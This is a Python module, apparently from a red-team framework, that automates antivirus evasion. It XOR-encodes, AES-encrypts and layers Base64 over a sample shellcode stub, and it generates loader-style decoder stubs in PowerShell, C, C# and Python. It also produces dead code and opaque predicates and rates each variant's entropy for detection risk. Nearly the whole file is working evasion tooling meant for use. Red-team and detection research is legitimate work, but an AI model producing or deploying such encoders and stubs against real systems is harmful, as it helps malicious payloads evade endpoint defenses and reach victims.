"""AV evasion through encoding, encryption, and obfuscation.

Maps to MITRE T1027 -- Obfuscated Files or Information.
"""

from __future__ import annotations

import base64
import random
import secrets

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from rich import box
from rich.console import Console
from rich.table import Table

from ghost.logger import info, ok, section, warn
from ghost.models import AttackResult, EngagementContext
from ghost.modules.base import BaseModule
from ghost.utils.artifacts import save_artifact
from ghost.utils.crypto import calc_entropy, rand_var, xor_bytes

console = Console()


class AVEvasionModule(BaseModule):
    """AV evasion through encoding, encryption, and obfuscation.
    Maps to MITRE T1027 -- Obfuscated Files or Information.
    """

    name = "AV Evasion Encoder"

    def run(self, ctx: EngagementContext) -> None:
        section("Module 2 -- AV Evasion Encoder [T1027]")

        sample_payload = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        techniques_generated = 0

        # -- XOR Encoding (single-byte and multi-byte) --
        info("Generating XOR-encoded variants...")
        single_key = secrets.token_bytes(1)
        multi_key = secrets.token_bytes(random.randint(4, 16))
        xor_single = xor_bytes(sample_payload, single_key)
        xor_multi = xor_bytes(sample_payload, multi_key)

        xor_ps_stub = self._gen_xor_decoder_ps(single_key)
        xor_c_stub = self._gen_xor_decoder_c(multi_key)
        xor_cs_stub = self._gen_xor_decoder_csharp(multi_key)
        xor_py_stub = self._gen_xor_decoder_python(multi_key)

        ok(f"XOR single-byte (key=0x{single_key.hex()}) -- {len(xor_single)} bytes")
        ok(f"XOR multi-byte (key={multi_key.hex()}, len={len(multi_key)}) -- {len(xor_multi)} bytes")
        techniques_generated += 2

        # -- AES-256-CBC Encryption --
        info("Generating AES-256-CBC encrypted payload...")
        aes_key = secrets.token_bytes(32)
        aes_iv = secrets.token_bytes(16)
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        aes_encrypted = cipher.encrypt(pad(sample_payload, AES.block_size))

        aes_stub = self._gen_aes_decrypt_stub(aes_key, aes_iv)
        ok(f"AES-256-CBC encrypted -- key={aes_key[:8].hex()}... iv={aes_iv[:4].hex()}...")
        techniques_generated += 1

        # -- Base64 Multi-layer Encoding --
        info("Generating multi-layer Base64 encoding...")
        encoded = sample_payload
        layers = ctx.encoding_iterations
        for _ in range(layers):
            encoded = base64.b64encode(encoded)
        ok(f"Base64 x{layers} -- output size {len(encoded)} bytes")
        techniques_generated += 1

        # -- String Reversal --
        info("Generating string reversal variant...")
        reversed_hex = sample_payload.hex()[::-1]
        ok(f"Reversed hex string -- {len(reversed_hex)} chars (reconstruct at runtime)")
        techniques_generated += 1

        # -- Variable Name Randomization --
        info("Generating randomized variable names...")
        var_names = [rand_var(random.randint(6, 14)) for _ in range(10)]
        ok(f"Generated {len(var_names)} random identifiers: {', '.join(var_names[:4])}...")
        techniques_generated += 1

        # -- Dead Code Insertion --
        info("Generating dead code blocks...")
        dead_code = self._generate_dead_code(6)
        ok(f"Generated {len(dead_code)} dead code blocks for insertion")
        techniques_generated += 1

        # -- Control Flow Obfuscation --
        info("Generating control flow obfuscation...")
        opaque = self._generate_opaque_predicates(4)
        ok(f"Generated {len(opaque)} opaque predicates for control flow flattening")
        techniques_generated += 1

        # -- Entropy Analysis --
        info("Running entropy analysis on encoded outputs...")
        entropy_raw = calc_entropy(sample_payload)
        entropy_xor = calc_entropy(xor_multi)
        entropy_aes = calc_entropy(aes_encrypted)
        entropy_b64 = calc_entropy(encoded)

        table = Table(title="Entropy Analysis", box=box.ROUNDED)
        table.add_column("Variant", style="cyan")
        table.add_column("Entropy (bits)", justify="right")
        table.add_column("Detection Risk", justify="center")

        for label, ent in [("Raw payload", entropy_raw), ("XOR multi-byte", entropy_xor),
                           ("AES-256-CBC", entropy_aes), (f"Base64 x{layers}", entropy_b64)]:
            risk = "HIGH" if ent > 7.5 else ("MEDIUM" if ent > 6.0 else "LOW")
            color = {"HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}[risk]
            table.add_row(label, f"{ent:.4f}", f"[{color}]{risk}[/{color}]")

        console.print(table)

        if entropy_aes > 7.5:
            warn("AES output entropy > 7.5 -- heuristic engines may flag as packed/encrypted")

        # -- Save decoder stubs --
        all_stubs = {
            "xor_decoder.ps1": xor_ps_stub,
            "xor_decoder.c": xor_c_stub,
            "xor_decoder.cs": xor_cs_stub,
            "xor_decoder.py": xor_py_stub,
            "aes_decrypt_stub.cs": aes_stub,
        }
        for fname, content in all_stubs.items():
            path = save_artifact(ctx, fname, content)
            ok(f"Saved {fname} -> {path}")

        ctx.results.append(AttackResult(
            module="av_evasion", action="encode_and_obfuscate", status="ok",
            severity="high", notes=f"Generated {techniques_generated} evasion techniques with decoder stubs"
        ))

    @staticmethod
    def _gen_xor_decoder_ps(key: bytes) -> str:
        return (
            f"# XOR Decoder -- PowerShell\n"
            f"# Key: 0x{key.hex()}\n"
            f"$key = 0x{key.hex()}\n"
            f"$enc = [byte[]]@( <# INSERT XOR-ENCODED BYTES HERE #> )\n"
            f"$dec = @()\n"
            f"foreach ($b in $enc) {{ $dec += ($b -bxor $key) }}\n"
            f"$code = [System.Runtime.InteropServices.Marshal]::Copy($dec, 0, $addr, $dec.Length)\n"
        )

    @staticmethod
    def _gen_xor_decoder_c(key: bytes) -> str:
        key_arr = ', '.join([f'0x{b:02x}' for b in key])
        return (
            f"// XOR Decoder -- C\n"
            f"// Multi-byte key, length {len(key)}\n"
            f"unsigned char key[] = {{ {key_arr} }};\n"
            f"unsigned char enc[] = {{ /* INSERT ENCODED BYTES */ }};\n"
            f"int key_len = sizeof(key);\n"
            f"int enc_len = sizeof(enc);\n\n"
            f"for (int i = 0; i < enc_len; i++) {{\n"
            f"    enc[i] ^= key[i % key_len];\n"
            f"}}\n"
        )

    @staticmethod
    def _gen_xor_decoder_csharp(key: bytes) -> str:
        key_arr = ', '.join([f'0x{b:02x}' for b in key])
        return (
            f"// XOR Decoder -- C#\n"
            f"byte[] key = new byte[] {{ {key_arr} }};\n"
            f"byte[] enc = new byte[] {{ /* INSERT ENCODED BYTES */ }};\n\n"
            f"for (int i = 0; i < enc.Length; i++)\n"
            f"    enc[i] ^= key[i % key.Length];\n"
        )

    @staticmethod
    def _gen_xor_decoder_python(key: bytes) -> str:
        return (
            f"# XOR Decoder -- Python\n"
            f"key = {list(key)}\n"
            f"enc = bytearray(b'')  # INSERT ENCODED BYTES\n\n"
            f"dec = bytearray(len(enc))\n"
            f"for i in range(len(enc)):\n"
            f"    dec[i] = enc[i] ^ key[i % len(key)]\n"
        )

    @staticmethod
    def _gen_aes_decrypt_stub(key: bytes, iv: bytes) -> str:
        return (
            f"// AES-256-CBC Decryption Stub -- C#\n"
            f"// Key: {key.hex()}\n"
            f"// IV:  {iv.hex()}\n\n"
            f"using System.Security.Cryptography;\n\n"
            f"byte[] key = Convert.FromBase64String(\"{base64.b64encode(key).decode()}\");\n"
            f"byte[] iv  = Convert.FromBase64String(\"{base64.b64encode(iv).decode()}\");\n"
            f"byte[] enc = Convert.FromBase64String(\"<INSERT_B64_PAYLOAD>\");\n\n"
            f"using (Aes aes = Aes.Create())\n"
            f"{{\n"
            f"    aes.Key = key;\n"
            f"    aes.IV = iv;\n"
            f"    aes.Mode = CipherMode.CBC;\n"
            f"    aes.Padding = PaddingMode.PKCS7;\n"
            f"    ICryptoTransform decryptor = aes.CreateDecryptor();\n"
            f"    byte[] dec = decryptor.TransformFinalBlock(enc, 0, enc.Length);\n"
            f"}}\n"
        )

    @staticmethod
    def _generate_dead_code(count: int) -> list:
        blocks = []
        for _ in range(count):
            v1, v2 = rand_var(), rand_var()
            op = random.choice(['+', '-', '*', '^'])
            val = random.randint(1, 99999)
            blocks.append(f"int {v1} = {val}; int {v2} = {v1} {op} {random.randint(1,999)};")
        return blocks

    @staticmethod
    def _generate_opaque_predicates(count: int) -> list:
        predicates = []
        for _ in range(count):
            x = rand_var()
            predicates.append(f"int {x} = 7; if (({x} * {x} - 49) == 0) {{ /* always true */ }}")
        return predicates
